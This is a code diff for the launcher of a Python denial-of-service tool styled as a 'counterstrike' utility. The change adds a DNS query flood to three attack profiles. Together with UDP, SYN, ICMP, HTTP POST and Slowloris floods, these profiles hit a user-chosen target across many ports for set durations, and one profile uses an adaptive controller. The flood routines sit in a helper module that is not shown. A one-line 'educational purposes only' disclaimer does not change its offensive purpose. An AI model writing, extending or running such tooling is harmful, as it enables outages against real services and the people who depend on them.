@@ -1,4 +1,4 @@
-# main.py (Updated to integrate L7 attacks into blended profiles)
+# main.py (Updated to integrate DNS Query Flood into blended profiles)
 
 import threading
 import time
@@ -15,43 +15,40 @@ def launch_attack_thread(target_func, args_tuple):
 
 
 def full_scale_counter_strike(target):
-    """
-    Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
-    This is a siege designed to run for a long time.
-    """
+    """Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack."""
     print("=" * 60 + "\nMODE: FULL SCALE COUNTER-STRIKE (SIEGE)\n" + "=" * 60)
     stop_event, pause_event = threading.Event(), threading.Event()
     attack_threads = []
 
-    # --- Parameters for a long-running, high-intensity siege ---
     params = {
-        "threads": 250,  # High thread count for floods
-        "slowloris_sockets": 200,  # Sockets for the 'low and slow' attack
-        "duration": 360,  # General duration for most attacks
+        "threads": 250,
+        "slowloris_sockets": 200,
+        "duration": 360,
     }
     print(
         f"[CONFIG] Siege mode: Using {params['threads']} threads and {params['slowloris_sockets']} Slowloris sockets per vector.")
 
-    # --- Launch Network Layer Floods (L3/L4) ---
-    print("[+] Preparing Network Layer vectors (UDP, SYN, ICMP)...")
+    # --- Launch Network Layer Floods (L3/L4 & L7-DNS) ---
+    print("[+] Preparing Network Layer vectors (UDP, SYN, ICMP, DNS Query)...")
+    # NEW: DNS Query Flood
+    args = (target, params["duration"], stop_event, pause_event, params["threads"])
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
+    # UDP, SYN, ICMP
     for port in [53, 443, 123]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
-        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
     for port in [80, 443, 22, 3389, 25, 587]:  # SYN
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
-    # ICMP
     args = (target, params["duration"], stop_event, pause_event, params["threads"])
     attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
 
     # --- Launch Application Layer Attacks (L7) ---
     print("[+] Preparing Application Layer vectors (POST Flood, Slowloris)...")
-    # HTTP POST Flood (replaces the old GET flood)
-    for port in [80, 443, 8080, 8443]:
+    for port in [80, 443, 8080, 8443]:  # HTTP POST
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
-    # Slowloris Attack
-    for port in [80, 443]:
+    for port in [80, 443]:  # Slowloris
         args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
 
@@ -64,38 +61,29 @@ def full_scale_counter_strike(target):
 
 
 def fast_scale_counter_strike(target):
-    """
-    Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
-    Includes the more effective HTTP POST flood.
-    """
+    """Launches a FAST, INTENSE, blended, multi-threaded counter-attack."""
     print("=" * 60 + "\nMODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)\n" + "=" * 60)
     stop_event, pause_event = threading.Event(), threading.Event()
     attack_threads = []
 
-    # --- Parameters for a short, focused burst ---
-    params = {
-        "threads": 100,  # Moderate thread count for a focused burst
-        "duration": 60,
-    }
+    params = {"threads": 100, "duration": 60}
     print(f"[CONFIG] Surgical mode: Using {params['threads']} threads per attack vector.")
 
-    # Launch focused L3/L4 attacks
+    # NEW: DNS Query Flood
+    args = (target, params["duration"], stop_event, pause_event, params["threads"])
+    attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
+    # Other focused attacks
     for port in [53, 443]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
-        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
     for port in [80, 443, 22]:  # SYN
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
-    # ICMP
-    args = (target, params["duration"], stop_event, pause_event, params["threads"])
-    attack_threads.append(launch_attack_thread(counter_strike_helper.icmpflood, args))
-
-    # Launch focused L7 attack (HTTP POST Flood)
-    for port in [80, 443]:
+    for port in [80, 443]:  # HTTP POST
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
 
-    print(f"[+] Fast-scale attack launched. Running for {params['duration']} seconds. Press Ctrl+C to stop.")
+    print(f"[+] Fast-scale attack launched. Running for {params['duration']}s. Press Ctrl+C to stop.")
     try:
         time.sleep(params["duration"])
     except KeyboardInterrupt:
@@ -106,12 +94,10 @@ def fast_scale_counter_strike(target):
 
 
 def adaptive_strike(target):
-    """
-    Launches a 'Fast Scale' attack profile (including POST flood) managed
-    by an adaptive controller.
-    """
+    """Launches a 'Fast Scale' profile managed by an adaptive controller."""
     print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
     try:
+        # ... (user input remains the same)
         check_port = int(input("Enter the port to monitor for target status (e.g., 80 or 443): "))
         check_interval = int(input("Enter the status check interval in seconds (e.g., 15): "))
         total_duration = int(input("Enter the total attack duration in seconds (e.g., 600): "))
@@ -123,19 +109,17 @@ def adaptive_strike(target):
 
     stop_event, pause_event = threading.Event(), threading.Event()
 
-    # Define the attack profile, now including the HTTP POST flood
+    # Define the attack profile, now including the DNS Query flood
     attack_profile = [
-        (counter_strike_helper.attack_udp, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
-        (counter_strike_helper.attack_udp, ("UDP-Mix", target, 443, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
         (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
         (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads)),
-        (counter_strike_helper.attack_http_post, (target, 443, total_duration, stop_event, pause_event, threads)),
     ]
 
     for func, args in attack_profile:
         launch_attack_thread(func, args)
 
-    # Launch the adaptive controller
     controller_args = (target_ip, check_port, stop_event, pause_event, check_interval)
     launch_attack_thread(counter_strike_helper.adaptive_attack_controller, controller_args)
 
@@ -150,7 +134,7 @@ def adaptive_strike(target):
         time.sleep(2)
 
 
-# --- Main Execution Block (Simplified Menu) ---
+# --- Main Execution Block with Updated Descriptions ---
 if __name__ == "__main__":
     print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
@@ -159,9 +143,9 @@ if __name__ == "__main__":
     try:
         options_text = """
 Select an Attack Profile:
-  1: Full Scale Counterstrike (Long, all-vector siege including Slowloris)
-  2: Fast Counterstrike (Short, intense burst with POST flood)
-  3: Adaptive Counterstrike (Smart, responsive attack with POST flood)
+  1: Full Scale Counterstrike (Long siege with all vectors, including Slowloris and DNS Query Flood)
+  2: Fast Counterstrike (Short burst with POST and DNS Query Floods)
+  3: Adaptive Counterstrike (Smart attack with POST and DNS Query Floods)
 
 Please enter your option: """
         options = int(input(options_text))
